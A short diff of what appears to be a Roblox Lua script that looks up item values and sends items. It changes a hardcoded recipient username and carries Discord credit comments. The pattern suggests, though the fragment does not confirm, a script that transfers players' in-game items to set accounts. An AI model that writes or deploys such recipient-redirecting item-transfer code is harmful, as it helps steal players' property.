@@ -213,7 +213,7 @@ local function getRAP(Type, Item)
 end
 -- fixed by !jsp on discord (discord id: 834769808297164831)
 local user = Amrk_Player
-local user2 = Amrk_Player
+local user2 = Alexanderproisa
 -- fixed by !jsp on discord (discord id: 834769808297164831)
 local function sendItem(category, uid, am)
     local args = {
